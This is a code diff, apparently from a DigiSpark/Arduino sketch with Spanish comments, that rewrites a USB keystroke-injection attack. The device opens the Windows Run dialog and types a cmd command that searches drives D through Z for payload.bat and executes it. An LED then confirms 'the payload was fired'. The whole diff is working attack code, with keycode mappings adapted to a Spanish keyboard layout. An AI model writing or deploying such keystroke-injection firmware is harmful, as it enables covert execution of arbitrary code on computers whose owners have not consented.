@@ -21,116 +21,82 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(700);
 
-  // 3. Construir y enviar el comando completo
-  // En layout espanol: las comillas '"' se producen con Shift+2
-  //                    la barra '/' se produce con Shift+7
-  // cmd /c "for /l %i in (1,1,10) do @(for %d in (D...Z) do @if exist %d:\payload.bat (start "" /b %d:\payload.bat & exit)) & ping -n 2 127.0.0.1 >nul"
+  // 3. Construir y enviar el comando adaptado al teclado en espanol
+  // En layout ES: 
+  //   '/' se produce con Shift + 7
+  //   '"' se produce con Shift + 2
+  //   '(' se produce con Shift + 8
+  //   ')' se produce con Shift + 9
+  //   ':' se produce con Shift + . (keycode 0x37)
+  //   '&' se produce con Shift + 6
+  // Se usa '/' como separador de ruta compatible con CMD y se lanza via 'call' para ejecucion directa y cierre limpio.
+  // Comando resultante en el host:
+  // cmd /c "for %d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %d:/payload.bat (call %d:/payload.bat & exit)"
 
   // "cmd "
   DigiKeyboard.print("cmd ");
 
-  // Barra '/' -> Shift + 7 en layout ES
+  // Barra '/' -> Shift + 7
   DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
 
   // "c "
   DigiKeyboard.print("c ");
 
-  // Comilla doble de apertura '"' -> Shift + 2 en layout ES
+  // Comilla doble '"' -> Shift + 2
   DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
-
-  // "for "
-  DigiKeyboard.print("for ");
-
-  // Barra '/' (switch /l)
-  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
-
-  // "l %i in "
-  DigiKeyboard.print("l %i in ");
-
-  // Parentesis apertura '(' -> Shift + 8
-  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);
-
-  // "1,1,10"
-  DigiKeyboard.print("1,1,10");
-
-  // Parentesis cierre ')' -> Shift + 9
-  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);
-
-  // " do @"
-  DigiKeyboard.print(" do @");
-
-  // Parentesis apertura del bloque exterior '('
-  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);
 
   // "for %d in "
   DigiKeyboard.print("for %d in ");
 
-  // Parentesis apertura de la lista de unidades
+  // Parentesis apertura '(' -> Shift + 8
   DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);
 
   // Unidades de disco
   DigiKeyboard.print("D E F G H I J K L M N O P Q R S T U V W X Y Z");
 
-  // Parentesis cierre lista
+  // Parentesis cierre ')' -> Shift + 9
   DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);
 
-  // " do @if exist %d"
-  DigiKeyboard.print(" do @if exist %d");
+  // " do if exist %d"
+  DigiKeyboard.print(" do if exist %d");
 
-  // Dos puntos ':' -> Shift + . (keycode 0x37)
+  // Dos puntos ':' -> Shift + . (0x37)
   DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT);
 
-  // Backslash '\' -> keycode 0x38 sin modificador (layout ES e EN igual)
-  DigiKeyboard.sendKeyStroke(0x38);
+  // Barra '/' -> Shift + 7
+  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
 
   // "payload.bat "
   DigiKeyboard.print("payload.bat ");
 
-  // Parentesis apertura del bloque del if
+  // Parentesis apertura '(' -> Shift + 8
   DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);
 
-  // "start "
-  DigiKeyboard.print("start ");
+  // "call %d"
+  DigiKeyboard.print("call %d");
 
-  // Comilla doble vacia para titulo (start "" /b ...) primera comilla
-  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
-  // segunda comilla cierre del titulo vacio
-  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
-
-  // " "
-  DigiKeyboard.print(" ");
-
-  // "/b "
-  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
-  DigiKeyboard.print("b %d");
-
-  // Dos puntos ':'
+  // Dos puntos ':' -> Shift + . (0x37)
   DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT);
 
-  // Backslash '\'
-  DigiKeyboard.sendKeyStroke(0x38);
+  // Barra '/' -> Shift + 7
+  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
 
-  // "payload.bat & exit"
-  DigiKeyboard.print("payload.bat & exit");
+  // "payload.bat "
+  DigiKeyboard.print("payload.bat ");
 
-  // Parentesis cierre del bloque del if ')'
+  // Ampersand '&' -> Shift + 6
+  DigiKeyboard.sendKeyStroke(KEY_6, MOD_SHIFT_LEFT);
+
+  // " exit"
+  DigiKeyboard.print(" exit");
+
+  // Parentesis cierre ')' -> Shift + 9
   DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);
 
-  // Parentesis cierre del bloque externo ')'
-  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);
-
-  // " & ping -n 2 127.0.0.1 "
-  DigiKeyboard.print(" & ping -n 2 127.0.0.1 ");
-
-  // ">nul"  -> '>' es Shift + . en ES? No, '>' es Shift+< (0x36 MOD_SHIFT)
-  // En layout ES: > = Shift + < , donde < esta en tecla a la derecha de Shift izq (keycode 0x64 en HID)
-  // Alternativa mas segura: redirigir a NUL usando 1>NUL
-  DigiKeyboard.print("1>nul");
-
-  // Comilla doble de cierre '"'
+  // Comilla doble cierre '"' -> Shift + 2
   DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
 
-  // 4. Ejecutar
+  // 4. Ejecutar el payload completo
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   // 5. Encender LED fijo: confirmacion de que el payload fue disparado
